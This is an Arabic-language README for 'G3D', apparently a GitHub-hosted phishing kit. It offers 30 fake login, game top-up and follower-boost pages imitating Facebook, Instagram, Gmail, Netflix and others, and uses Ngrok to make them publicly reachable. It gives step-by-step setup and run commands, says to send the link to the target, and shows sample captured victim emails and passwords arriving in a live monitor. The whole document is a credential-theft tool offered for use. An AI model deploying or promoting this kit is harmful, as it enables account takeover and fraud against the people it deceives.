## ✨ المميزات

- 🎨 **30 قالباً جاهزاً** مقسمة إلى 3 فئات ملونة:
  - 🔵 10 صفحات تسجيل دخول (فيسبوك، انستقرام، تويتر، سناب شات، تيك توك، جيميل، ياهو، لينكد إن، GitHub، Netflix)
  - 🟢 10 صفحات شحن ألعاب (فري فاير، ببجي، فورتنايت، روبلوكس، كود فري فاير، كلاش أوف كلانس، كود ببجي، ماين كرافت، جواهر فري فاير، ستيم)
  - 🟣 10 صفحات رشق متابعين (انستقرام، تيك توك، تويتر، لايكات انستقرام، مشاهدات تيك توك، ريتويت تويتر، فيسبوك، يوتيوب، سناب شات، جميع المنصات)
- 🌐 **تكامل تلقائي مع Ngrok** للحصول على رابط عام
- 📊 **تخزين البيانات** في ملف JSON مع تسلسل ID
- 🖥️ **واجهة سطر أوامر** تفاعلية بالعربية
- 📡 **مراقبة حية** للبيانات الواردة
- 🎨 **تصميم احترافي** للصفحات المزيفة

## 🚀 التثبيت السريع

### 1️⃣ استنساخ المستودع
```bash
git clone https://github.com/zen66554435-max/G3D.git
cd G3D
```

### 2️⃣ إنشاء بيئة افتراضية (اختياري لكن مستحسن)
```bash
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
# أو
venv\Scripts\activate  # Windows
```

### 3️⃣ تثبيت المكتبات
```bash
pip install -r requirements.txt
```

### 4️⃣ الحصول على توكن Ngrok
1. قم بإنشاء حساب مجاني على [ngrok.com](https://ngrok.com)
2. انسخ التوكن الخاص بك من لوحة التحكم
3. الصقه عند تشغيل الأداة

## ⚡ التشغيل السهل

### 🎯 تشغيل بأمر واحد
```bash
python3 G3D.py
```

### 📋 خطوات التشغيل السريع

| الخطوة | الوصف |
|--------|-------|
| 1 | **شاشة البداية**: ستظهر شاشة ترحيبية ملونة مع شعار الأداة |
| 2 | **إدخال توكن Ngrok**: أدخل توكن Ngrok الخاص بك |
| 3 | **انتظار الرابط**: سيظهر الرابط العام (مثال: `https://xxxx.ngrok.io`) |
| 4 | **اختيار القالب**: اختر رقم القالب من القائمة (1-30) |
| 5 | **نسخ الرابط**: انسخ الرابط وارسله للهدف |
| 6 | **بدء المراقبة**: اختر "1" لبدء مراقبة البيانات الواردة |

### 📤 مثال على الإخراج
```
╔══════════════════════════════════════╗
║         🎯 G3D - أداة التصيد         ║
╚══════════════════════════════════════╝

[+] ✅ الرابط العام: https://abc123.ngrok.io

[+] 🔗 رابط الصفحة المزيفة:
https://abc123.ngrok.io/فيسبوك

1. 🟢 بدء مراقبة البيانات
2. 🟡 العودة للقوالب
3. 🔴 خروج
```

### 📥 البيانات الملتقطة
عندما يدخل الهدف بياناته، ستظهر في المراقبة:
```
⬇️  بيانات جديدة!
⏱  الوقت: 2024-01-15 14:30:25
🌍 IP: 192.168.1.100
📄 المصدر: https://abc123.ngrok.io/فيسبوك
   email: victim@example.com
   pass: password123
----------------------------------------
```
